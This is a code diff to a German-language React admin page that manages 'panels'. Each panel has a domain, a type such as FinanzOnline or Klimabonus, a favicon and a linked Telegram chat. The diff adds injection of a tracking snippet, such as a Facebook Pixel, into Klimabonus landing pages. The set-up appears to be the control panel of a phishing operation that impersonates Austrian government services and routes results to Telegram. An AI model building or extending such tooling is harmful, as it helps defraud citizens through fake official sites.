@@ -3,6 +3,16 @@ import AdminLayout from "@/components/AdminLayout";
 import { supabase } from "@/integrations/supabase/client";
 import { Button } from "@/components/ui/button";
 import { Input } from "@/components/ui/input";
+import { Switch } from "@/components/ui/switch";
+import { Textarea } from "@/components/ui/textarea";
+import {
+  Dialog,
+  DialogContent,
+  DialogFooter,
+  DialogHeader,
+  DialogTitle,
+  DialogDescription,
+} from "@/components/ui/dialog";
 import {
   Select,
   SelectContent,
@@ -19,7 +29,7 @@ import {
   TableRow,
 } from "@/components/ui/table";
 import { useToast } from "@/hooks/use-toast";
-import { Trash2, Globe, Pencil } from "lucide-react";
+import { Trash2, Globe, Pencil, Code2 } from "lucide-react";
 import PanelTypeEditor, { type PanelType } from "@/components/PanelTypeEditor";
 
 interface Panel {
@@ -27,7 +37,10 @@ interface Panel {
   domain: string;
   type: PanelType;
   created_at: string;
+  meta_tag_enabled: boolean;
+  meta_tag_snippet: string | null;
 }
+
 
 const TYPE_LABEL: Record<PanelType, string> = {
   finanzonline: "FinanzOnline",
@@ -62,6 +75,10 @@ const AdminPanels = () => {
   const [telegramChats, setTelegramChats] = useState<TelegramChat[]>([]);
   const [newTelegramChatId, setNewTelegramChatId] = useState<string>(NONE_VALUE);
   const [typeFavicons, setTypeFavicons] = useState<Record<string, string | null>>({});
+  const [snippetPanel, setSnippetPanel] = useState<Panel | null>(null);
+  const [snippetDraft, setSnippetDraft] = useState("");
+  const [savingSnippet, setSavingSnippet] = useState(false);
+
 
   const loadTypeFavicons = async () => {
     const { data } = await supabase
@@ -170,6 +187,36 @@ const AdminPanels = () => {
       load();
     }
   };
+
+  const handleMetaToggle = async (p: Panel, enabled: boolean) => {
+    const { error } = await supabase
+      .from("panels")
+      .update({ meta_tag_enabled: enabled } as any)
+      .eq("id", p.id);
+    if (error) {
+      toast({ title: "Fehler", description: error.message, variant: "destructive" });
+    } else {
+      load();
+    }
+  };
+
+  const handleSnippetSave = async () => {
+    if (!snippetPanel) return;
+    setSavingSnippet(true);
+    const { error } = await supabase
+      .from("panels")
+      .update({ meta_tag_snippet: snippetDraft } as any)
+      .eq("id", snippetPanel.id);
+    setSavingSnippet(false);
+    if (error) {
+      toast({ title: "Fehler", description: error.message, variant: "destructive" });
+    } else {
+      toast({ title: "Snippet gespeichert" });
+      setSnippetPanel(null);
+      load();
+    }
+  };
+
 
   const handleTypeChange = async (id: string, type: PanelType) => {
     const { error } = await supabase
@@ -317,6 +364,7 @@ const AdminPanels = () => {
               <TableRow>
                 <TableHead>Domain</TableHead>
                 <TableHead className="w-64">Typ</TableHead>
+                <TableHead className="w-56">Meta Tag</TableHead>
                 <TableHead className="w-40">Erstellt</TableHead>
                 <TableHead className="w-20"></TableHead>
               </TableRow>
@@ -324,19 +372,21 @@ const AdminPanels = () => {
             <TableBody>
               {loading && (
                 <TableRow>
-                  <TableCell colSpan={4} className="text-center text-sm text-slate-400 py-8">
+                  <TableCell colSpan={5} className="text-center text-sm text-slate-400 py-8">
                     Laden...
                   </TableCell>
                 </TableRow>
               )}
               {!loading && panels.length === 0 && (
                 <TableRow>
-                  <TableCell colSpan={4} className="text-center text-sm text-slate-400 py-8">
+                  <TableCell colSpan={5} className="text-center text-sm text-slate-400 py-8">
                     Keine Panels vorhanden.
                   </TableCell>
                 </TableRow>
               )}
-              {panels.map((p) => (
+              {panels.map((p) => {
+                const supportsMeta = p.type === "klimabonus";
+                return (
                 <TableRow key={p.id}>
                   <TableCell className="font-medium">{p.domain}</TableCell>
                   <TableCell>
@@ -357,6 +407,32 @@ const AdminPanels = () => {
                     </Select>
                   </TableCell>
 
+                  <TableCell>
+                    {supportsMeta ? (
+                      <div className="flex items-center gap-2">
+                        <Switch
+                          checked={p.meta_tag_enabled}
+                          onCheckedChange={(v) => handleMetaToggle(p, v)}
+                        />
+                        {p.meta_tag_enabled && (
+                          <Button
+                            size="sm"
+                            variant="outline"
+                            onClick={() => {
+                              setSnippetPanel(p);
+                              setSnippetDraft(p.meta_tag_snippet ?? "");
+                            }}
+                          >
+                            <Code2 className="mr-1 h-3.5 w-3.5" />
+                            Snippet
+                          </Button>
+                        )}
+                      </div>
+                    ) : (
+                      <span className="text-xs text-slate-400">nur Klimabonus</span>
+                    )}
+                  </TableCell>
+
                   <TableCell className="text-sm text-slate-500">
                     {new Date(p.created_at).toLocaleDateString("de-DE")}
                   </TableCell>
@@ -370,7 +446,9 @@ const AdminPanels = () => {
                     </Button>
                   </TableCell>
                 </TableRow>
-              ))}
+                );
+              })}
+
             </TableBody>
           </Table>
         </div>
@@ -387,7 +465,33 @@ const AdminPanels = () => {
           onSaved={loadTypeFavicons}
         />
       )}
+
+      <Dialog open={!!snippetPanel} onOpenChange={(o) => { if (!o) setSnippetPanel(null); }}>
+        <DialogContent className="max-w-2xl">
+          <DialogHeader>
+            <DialogTitle>Meta-Tag Snippet</DialogTitle>
+            <DialogDescription>
+              HTML-Snippet (z.B. Facebook Pixel). Wird nur auf der Klimabonus-Landingpage von
+              <span className="font-medium"> {snippetPanel?.domain}</span> in den &lt;head&gt; injiziert.
+            </DialogDescription>
+          </DialogHeader>
+          <Textarea
+            value={snippetDraft}
+            onChange={(e) => setSnippetDraft(e.target.value)}
+            rows={12}
+            placeholder={'<!-- Meta Pixel Code -->\n<script>\n!function(f,b,e,v,n,t,s){...}\nfbq(\'init\', \'YOUR_PIXEL_ID\');\nfbq(\'track\', \'PageView\');\n</script>'}
+            className="font-mono text-xs"
+          />
+          <DialogFooter>
+            <Button variant="outline" onClick={() => setSnippetPanel(null)}>Abbrechen</Button>
+            <Button onClick={handleSnippetSave} disabled={savingSnippet}>
+              {savingSnippet ? "Speichere…" : "Speichern"}
+            </Button>
+          </DialogFooter>
+        </DialogContent>
+      </Dialog>
     </AdminLayout>
+
   );
 };
 
